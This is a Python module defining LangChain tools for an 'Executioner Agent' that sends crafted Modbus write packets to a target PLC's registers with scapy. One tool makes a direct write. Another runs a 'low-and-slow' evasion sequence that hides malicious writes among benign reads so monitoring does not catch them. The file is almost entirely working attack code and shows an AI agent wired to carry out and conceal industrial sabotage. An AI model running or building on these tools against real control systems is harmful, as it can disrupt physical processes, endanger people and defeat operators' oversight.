# toolkits/executioner_tools.py

import time
import json
from langchain_core.tools import tool
from scapy.all import send
from scapy.layers.inet import TCP, IP
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest, ModbusPDU10WriteMultipleRegistersRequest

# This module contains the toolkit for the Executioner Agent.

@tool
def execute_direct_attack(target_ip: str, plc_register: int, value: int) -> str:
    """
    Sends a single, direct Modbus packet to the target PLC.
    This is the 'loud' attack that is more likely to be detected by monitoring systems.

    Args:
        target_ip: The IP address of the target PLC.
        plc_register: The register to write to.
        value: The value to write to the register.

    Returns:
        A confirmation string that the attack payload was sent.
    """
    print(f"--- EXECUTIONER/TOOL: Sending DIRECT attack to {target_ip}... ---")
    pdu = ModbusPDU10WriteMultipleRegistersRequest(startingAddr=plc_register, outputsValue=[value])
    adu = ModbusADURequest(transId=4, protoId=0, unitId=1, pdu=pdu)
    packet = IP(dst=target_ip) / TCP(sport=1028, dport=502) / adu

    send(packet, verbose=0)

    return f"Direct attack payload sent to {target_ip}. Wrote value {value} to register {plc_register}."

@tool
def execute_evasion_sequence(sequence_plan_str: str) -> str:
    """
    Executes a 'low-and-slow' model evasion attack based on a plan from the Saboteur.
    It sends benign traffic interspersed with the malicious packet to avoid detection.

    Args:
        sequence_plan_str: A string representing the JSON plan for the sequence.

    Returns:
        A confirmation that the full sequence was executed.
    """
    print("--- EXECUTIONER/TOOL: Executing low-and-slow EVASION sequence... ---")

    try:
        plan = json.loads(sequence_plan_str.replace("'", "\"")) # Handle potential single quotes
        target_ip = plan['target']
    except (json.JSONDecodeError, KeyError) as e:
        return f"Error: Invalid sequence plan format. Could not parse JSON. Details: {e}"

    for step in plan['steps']:
        action = step['action']
        delay = step.get('delay_after', 0)

        packet = None
        if action == "SEND_BENIGN_READ":
            print(f"--- EXECUTIONER: Sending benign read packet to register {step['register']}...")
            pdu = ModbusPDU03ReadHoldingRegistersRequest(startAddr=step['register'], quantity=1)
            adu = ModbusADURequest(pdu=pdu)
            packet = IP(dst=target_ip) / TCP(dport=502) / adu

        elif action == "SEND_EXPLOIT_WRITE":
            print(f"--- EXECUTIONER: Sending MALICIOUS write packet to register {step['register']}...")
            pdu = ModbusPDU10WriteMultipleRegistersRequest(startingAddr=step['register'], outputsValue=[step['value']])
            adu = ModbusADURequest(pdu=pdu)
            packet = IP(dst=target_ip) / TCP(dport=502) / adu

        if packet:
            send(packet, verbose=0)

        if delay > 0:
            print(f"--- EXECUTIONER: Waiting for {delay} seconds... ---")
            time.sleep(delay)

    return f"Model evasion sequence successfully executed against {target_ip}."